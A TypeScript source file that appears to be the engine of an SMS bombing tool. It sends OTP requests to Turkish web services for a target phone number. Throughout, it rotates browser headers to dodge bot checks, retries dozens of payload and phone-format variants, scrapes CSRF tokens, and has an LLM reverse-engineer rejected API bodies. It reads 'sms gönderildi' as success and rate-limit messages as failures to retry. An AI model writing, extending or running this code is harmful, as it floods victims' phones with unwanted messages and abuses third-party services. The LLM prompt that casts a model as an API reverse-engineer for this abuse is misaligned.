/* eslint-disable @typescript-eslint/no-explicit-any */
import axios, { AxiosError } from 'axios';

export const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
];

export const LANGUAGES = [
  'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
  'tr-TR,tr;q=0.9,en;q=0.5',
  'en-US,en;q=0.9,tr;q=0.8',
  'tr,en-US;q=0.9,en;q=0.8',
];
const SEC_FETCH_DEST = ['empty', 'empty', 'empty', 'document'];
const SEC_FETCH_MODE = ['cors', 'cors', 'navigate', 'same-origin'];
const SEC_FETCH_SITE = ['same-origin', 'same-site', 'cross-site'];

export const PHONE_FIELD_NAMES = [
  'phone',
  'mobilePhone',
  'phoneNumber',
  'mobilePhoneNumber',
  'mobile_phone',
  'telephone',
  'gsm',
  'cepTelefonu',
  'telefon',
  'mobile',
  'cellPhone',
  'Phone',
  'MobilePhone',
  'TelephoneNumber',
];

export function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

export function sleep(ms: number): Promise<void> {
  return new Promise(r => setTimeout(r, ms));
}

export function buildRotatingHeaders(origin?: string): Record<string, string> {
  const headers: Record<string, string> = {
    'User-Agent': pickRandom(USER_AGENTS),
    Accept: 'application/json, text/plain, */*',
    'Accept-Language': pickRandom(LANGUAGES),
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Cache-Control': 'no-cache',
    Pragma: 'no-cache',
    DNT: '1',
    Connection: 'keep-alive',
    'Sec-Fetch-Dest': pickRandom(SEC_FETCH_DEST),
    'Sec-Fetch-Mode': pickRandom(SEC_FETCH_MODE),
    'Sec-Fetch-Site': pickRandom(SEC_FETCH_SITE),
  };
  if (origin) {
    headers['Origin'] = origin;
    headers['Referer'] = origin + '/';
  }
  return headers;
}

export function interpolatePhone(schema: any, targetPhone: string, email?: string): any {
  let str = JSON.stringify(schema);
  str = str.replace(/{{PHONE}}/g, targetPhone);
  str = str.replace(/{{EMAIL}}/g, email || 'test@test.com');
  str = str.replace(/\+905XXXXXXXXX/g, `+90${targetPhone}`);
  str = str.replace(/905XXXXXXXXX/g, `90${targetPhone}`);
  str = str.replace(/05XXXXXXXXX/g, `0${targetPhone}`);
  str = str.replace(/5XXXXXXXXX/g, targetPhone);
  return JSON.parse(str);
}

export function isHtmlBody(data: any): boolean {
  if (typeof data !== 'string') return false;
  const trimmed = data.trimStart();
  const lower = trimmed.toLowerCase();
  return lower.startsWith('<!doctype') || lower.startsWith('<html') || trimmed.startsWith('<HTML');
}

export function isGenuineSuccess(data: any): boolean {
  if (data === null || data === undefined) return true;
  if (typeof data === 'string') {
    if (data.trim() === '') return true;
    const lower = data.toLowerCase();
    if (lower.includes('rate limit') || lower.includes('cok fazla istek')) return false;
    return true;
  }
  const str = JSON.stringify(data).toLowerCase();

  const hardFail = [
    '"status":false',
    '"issuccessful":false',
    '"smsrequired":false',
    '"success":false',
    '"iserror":true',
    'otomatik erisim',
    'yeni sürüm gerekli',
    'yeni surum gerekli',
    'ust üste cok fazla istek',
    'cok fazla istek',
    'lutfen 1 dakika',
  ];
  if (hardFail.some(p => str.includes(p))) return false;

  const hardSuccess = [
    '"responsetype":"success"',
    'sms gönderildi',
    'sms gonderildi',
    'claimid',
    '"data":"200 ok"',
  ];
  if (hardSuccess.some(p => str.includes(p))) return true;

  return true;
}

export function cleanHtmlForAi(rawHtml: string): string {
  if (!rawHtml) return 'No body';
  let str = typeof rawHtml === 'string' ? rawHtml : JSON.stringify(rawHtml);
  str = str.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  str = str.replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '');
  str = str.replace(/<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi, '');
  str = str.replace(/<!--[\s\S]*?-->/g, '');
  str = str.replace(/\s+/g, ' ').trim();
  return str.length > 2500 ? str.substring(0, 2500) + '...[TRUNCATED]' : str;
}

export function findPhoneField(obj: any): string | null {
  for (const key of Object.keys(obj)) {
    const v = String(obj[key]);
    if (/^(\+?90|0)?5\d{9}$/.test(v) || /^5XXXXXXXXX$/.test(v) || /^905XXXXXXXXX$/.test(v) || /^05XXXXXXXXX$/.test(v)) {
      return key;
    }
  }
  return null;
}

export function buildSmartVariants(originalPayload: any, targetPhone: string, email?: string): Record<string, any>[] {
  const variants: Record<string, any>[] = [];
  const phoneFormats = [targetPhone, `0${targetPhone}`, `90${targetPhone}`, `+90${targetPhone}`];
  const phoneField = findPhoneField(originalPayload);
  const baseKeys = Object.keys(originalPayload).filter(k => k !== phoneField && k !== 'email');

  for (const newField of PHONE_FIELD_NAMES.slice(0, 10)) {
    for (const fmt of phoneFormats) {
      const v: Record<string, any> = {};
      for (const k of baseKeys) v[k] = originalPayload[k];
      v[newField] = fmt;
      if (email) v.email = email;
      variants.push(v);
    }
  }

  for (const newField of PHONE_FIELD_NAMES) {
    for (const fmt of phoneFormats) {
      const v: Record<string, any> = { [newField]: fmt };
      if (email) v.email = email;
      variants.push(v);
    }
  }

  return variants;
}

export async function withBackoff(step: number, fn: () => Promise<any>): Promise<any> {
  if (step > 1) await sleep(500 + Math.random() * 1000);
  return fn();
}

export interface ExecuteResult {
  success: boolean;
  status: number;
  data: any;
  html: string;
  rawBody: string;
}

export async function executeRequest(url: string, method: string, payload: any, headers: any, timeout = 15000): Promise<ExecuteResult> {
  try {
    const response = await axios({
      method: method || 'POST',
      url,
      data: payload,
      timeout,
      headers: headers || buildRotatingHeaders(),
      validateStatus: () => true,
    });
    const is200 = response.status >= 200 && response.status < 300;
    const rawData = response.data;
    const looksLikeHtml = is200 && isHtmlBody(rawData);
    const rawBody = typeof rawData === 'string' ? rawData : JSON.stringify(rawData);
    const genuineSuccess = is200 && !looksLikeHtml && isGenuineSuccess(rawData);
    return {
      success: genuineSuccess,
      status: response.status,
      data: rawData,
      html: looksLikeHtml ? rawBody : '',
      rawBody,
    };
  } catch (err: unknown) {
    const axiosErr = err as AxiosError;
    const caughtData = axiosErr.response?.data || (err as Error).message;
    const rawBody = typeof caughtData === 'string' ? caughtData : JSON.stringify(caughtData);
    return {
      success: false,
      status: axiosErr.response?.status || 0,
      data: caughtData,
      html: rawBody,
      rawBody,
    };
  }
}

export interface AttemptStrategiesOpts {
  serviceUrl: string;
  serviceMethod: string;
  targetPhone: string;
  email: string;
  payloadToUse: any;
  customHeaders?: Record<string, string>;
  groqClient?: any;
  groqApiKey?: string;
}

export async function attemptStrategies({
  serviceUrl,
  serviceMethod,
  targetPhone,
  email,
  payloadToUse,
  customHeaders,
  groqClient,
  groqApiKey,
}: AttemptStrategiesOpts): Promise<any[]> {
  const results: any[] = [];
  const origin = new URL(serviceUrl).origin;
  const rotatingHeaders = buildRotatingHeaders(origin);
  const mergedHeaders = { ...rotatingHeaders, ...(customHeaders || {}) };

  // 1 — Direct
  await withBackoff(1, async () => {
    const r1 = await executeRequest(serviceUrl, serviceMethod, payloadToUse, mergedHeaders);
    results.push({ attempt: 1, strategy: 'direct', ...r1 });
  });
  if (results[0]?.success) return results;

  // 2 — AI Healing
  const effectiveGroqKey = groqApiKey || process.env.GROQ_API_KEY || '';
  if (effectiveGroqKey) {
    await withBackoff(2, async () => {
      try {
        let client = groqClient;
        if (!client) {
          const mod = await import('groq-sdk');
          client = new mod.default({ apiKey: effectiveGroqKey });
        }
        const cleanedErrorBody = cleanHtmlForAi(results[0].html || JSON.stringify(results[0].data));
        const prompt = `You are a highly advanced API reverse-engineering AI. I tried to send a POST request to ${serviceUrl}. The payload I sent was: ${JSON.stringify(payloadToUse)} The server rejected it with HTTP ${results[0].status}. The server returned this error/HTML body: --- ${cleanedErrorBody} --- Based on this error or HTML form, deduce the correct JSON body format required by this API. You MUST output ONLY valid JSON. Nothing else. No markdown formatting. Where a phone number belongs, output EXACTLY the string "{{PHONE}}". Where an email belongs, output EXACTLY the string "{{EMAIL}}". Give me the fully corrected structured JSON.`;

        const chatCompletion = await client.chat.completions.create({
          model: 'llama-3.3-70b-versatile',
          messages: [
            { role: 'system', content: 'You extract API schemas and return strictly valid JSON.' },
            { role: 'user', content: prompt },
          ],
          response_format: { type: 'json_object' },
        });
        const healedJsonString = chatCompletion.choices[0].message.content;
        let healedSchema: any;
        try {
          healedSchema = JSON.parse(healedJsonString || '{}');
        } catch {
          results.push({ attempt: 2, strategy: 'ai_heal', success: false, status: 0, data: 'AI parse error' });
          return;
        }
        const healedPayload = interpolatePhone(healedSchema, targetPhone, email);
        const healResult = await executeRequest(serviceUrl, serviceMethod, healedPayload, buildRotatingHeaders(origin));
        results.push({ attempt: 2, strategy: 'ai_heal', ...healResult, healed: true, healedPayload: healedSchema });
      } catch (err: unknown) {
        results.push({ attempt: 2, strategy: 'ai_heal', success: false, status: 0, data: String(err) });
      }
    });
    if (results.some(r => r.success)) return results;
  }

  // 3 — form-urlencoded
  await withBackoff(3, async () => {
    const formHeaders = {
      ...mergedHeaders,
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest',
    };
    let encoded: string;
    try {
      const parsed = typeof payloadToUse === 'object' ? payloadToUse : JSON.parse(payloadToUse);
      encoded = new URLSearchParams(parsed).toString();
    } catch {
      encoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse);
    }
    const r3 = await executeRequest(serviceUrl, serviceMethod, encoded, formHeaders);
    results.push({ attempt: 3, strategy: 'form_urlencoded', ...r3 });
  });
  if (results.some(r => r.success)) return results;

  // 4 — bare phone
  await withBackoff(4, async () => {
    const r4 = await executeRequest(serviceUrl, serviceMethod, { phone: targetPhone }, { ...mergedHeaders });
    results.push({ attempt: 4, strategy: 'bare_phone', ...r4 });
  });
  if (results.some(r => r.success)) return results;

  // 5 — 90 format
  await withBackoff(5, async () => {
    const r5 = await executeRequest(serviceUrl, serviceMethod, { phone: `90${targetPhone}` }, { ...mergedHeaders });
    results.push({ attempt: 5, strategy: '90_format', ...r5 });
  });
  if (results.some(r => r.success)) return results;

  // 6 — Smart payload variants
  const smartVariants = buildSmartVariants(payloadToUse, targetPhone, email);
  for (let i = 0; i < Math.min(smartVariants.length, 25); i++) {
    const v = smartVariants[i];
    await withBackoff(6 + i, async () => {
      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
      results.push({ attempt: 6 + i, strategy: `smart_${Object.keys(v).filter(k => k !== 'email')[0] || 'phone'}`, ...r });
    });
    if (results.some(r => r.success)) return results;
  }

  // 7 — +90 prefix variations
  for (const field of PHONE_FIELD_NAMES.slice(0, 6)) {
    await withBackoff(100, async () => {
      const v = { [field]: `+90${targetPhone}` };
      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
      results.push({ attempt: 100, strategy: `plus90_${field}`, ...r });
    });
    if (results.some(r => r.success)) return results;
  }

  // 8 — 0 prefix variations
  for (const field of PHONE_FIELD_NAMES.slice(0, 6)) {
    await withBackoff(200, async () => {
      const v = { [field]: `0${targetPhone}` };
      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
      results.push({ attempt: 200, strategy: `zero_${field}`, ...r });
    });
    if (results.some(r => r.success)) return results;
  }

  // 9 — CSRF
  await withBackoff(300, async () => {
    const csrfHeaders = {
      ...mergedHeaders,
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    };

    try {
      const preflight = await axios({
        method: 'GET',
        url: origin + '/',
        timeout: 10000,
        headers: { 'User-Agent': pickRandom(USER_AGENTS), Accept: csrfHeaders['Accept'] },
        validateStatus: () => true,
        maxRedirects: 5,
      });

      if (preflight.status >= 200 && preflight.status < 400) {
        let csrfToken = '';
        const bodyStr = typeof preflight.data === 'string' ? preflight.data : '';
        const allSetCookies: string[] = preflight.headers['set-cookie'] || [];

        const aspMatch = bodyStr.match(/<input[^>]*name=["']__RequestVerificationToken["'][^>]*value=["']([^"']+)["'][^>]*\/?>/i);
        if (aspMatch) csrfToken = aspMatch[1];

        const djangoBodyMatch = bodyStr.match(/<input[^>]*name=["']csrfmiddlewaretoken["'][^>]*value=["']([^"']+)["']/i);
        if (!csrfToken && djangoBodyMatch) csrfToken = djangoBodyMatch[1];

        let djangoCookie = '';
        for (const c of allSetCookies) {
          const m = c.match(/csrftoken=([^;]+)/);
          if (m) {
            djangoCookie = m[1];
            break;
          }
        }

        if (csrfToken || djangoCookie) {
          const csrfMerged = { ...csrfHeaders, ...(customHeaders || {}) };
          csrfMerged['Content-Type'] = 'application/x-www-form-urlencoded';
          if (djangoCookie) {
            csrfMerged['X-CSRFToken'] = djangoCookie;
            csrfMerged['Cookie'] = 'csrftoken=' + djangoCookie;
          }

          let csrfEncoded: string;
          if (csrfToken) {
            const parsedPayload = typeof payloadToUse === 'object' ? { ...payloadToUse } : JSON.parse(JSON.stringify(payloadToUse));
            parsedPayload.__RequestVerificationToken = csrfToken;
            try {
              const kv = typeof parsedPayload === 'object' ? parsedPayload : JSON.parse(parsedPayload);
              csrfEncoded = new URLSearchParams(kv).toString();
            } catch {
              csrfEncoded = JSON.stringify(parsedPayload);
            }
          } else {
            try {
              const parsed = typeof payloadToUse === 'object' ? payloadToUse : JSON.parse(payloadToUse);
              csrfEncoded = new URLSearchParams(parsed).toString();
            } catch {
              csrfEncoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse);
            }
          }

          const r6 = await executeRequest(serviceUrl, serviceMethod, csrfEncoded, {
            ...csrfMerged,
            Origin: origin,
            Referer: origin + '/',
          });
          results.push({ attempt: 300, strategy: 'csrf', ...r6 });
          if (r6.success) return;

          const r6b = await executeRequest(serviceUrl, serviceMethod, payloadToUse, {
            ...csrfMerged,
            'Content-Type': 'application/json',
            Origin: origin,
            Referer: origin + '/',
          });
          results.push({ attempt: 301, strategy: 'csrf_json', ...r6b });
        }
      }
    } catch {
      // CSRF preflight failed, skip
    }
  });

  return results;
}
